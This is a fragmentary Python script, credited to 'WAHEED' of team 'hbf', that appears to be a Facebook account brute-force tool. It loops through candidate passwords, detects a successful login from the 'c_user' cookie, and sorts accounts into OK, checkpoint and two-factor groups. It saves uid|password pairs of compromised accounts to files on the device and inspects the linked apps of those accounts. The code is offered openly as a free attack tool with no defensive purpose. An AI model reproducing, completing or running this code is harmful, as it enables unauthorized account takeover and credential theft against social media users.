#created by WAHEED
#team name hbf
#tottaly written by WAHEED 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; WAHEED \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
WAHEED2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
[•] AUTHOR     : \033[1;32mWAHEED NAME TO SUNA HO GA 😈\033[1;37m
[•] STATUS     : \033[1;32mFREE HA ENJOY KRO \033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 1.0.3 \033[1;32m"DON'T WORRY FOR UPDATES!"\033[1;37m    
[•] \033[1;37mCREATOR    :\033[1;32m 1.0.3 \033[1;32m"CREATED BY WAH33D"\033[1;37m    

\033[1;37m\033[1;36m😈\033[1;37m═══════\033[41m\033[1;37m[ 𓆩𝐖𝟗𝐇𝟑𝟑𝐃𓆪 𓆩😈𓆪  𓆩 𝐁𝐑𝟗𝐍𝐃𓆪 ]\x1b[0m═══════😈\033[1;36m
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) WAHEED
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/WAHEED-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/WAHEED-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio WAHEED_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/WAHEED-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio WAHEED_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/WAHEED-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio WAHEED_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/WAHEED-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[WAHEED 🔥] [%s] \33[1;97m[OK:%s{WAHEED2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
